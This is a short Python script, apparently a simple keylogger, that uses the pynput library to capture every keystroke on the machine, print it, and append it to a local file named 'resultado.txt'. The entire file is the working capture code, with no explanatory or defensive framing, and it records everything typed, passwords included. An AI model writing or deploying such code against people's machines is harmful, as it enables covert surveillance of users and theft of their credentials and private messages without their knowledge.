from pynput import keyboard
from time import sleep

def on_press(key):
    print(key)
    with open("resultado.txt" , "a") as file:
        file.write(str(key).replace("'" , "").replace("Key.space" , " "))
        if "back" in str(key):
            file.write("\n")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
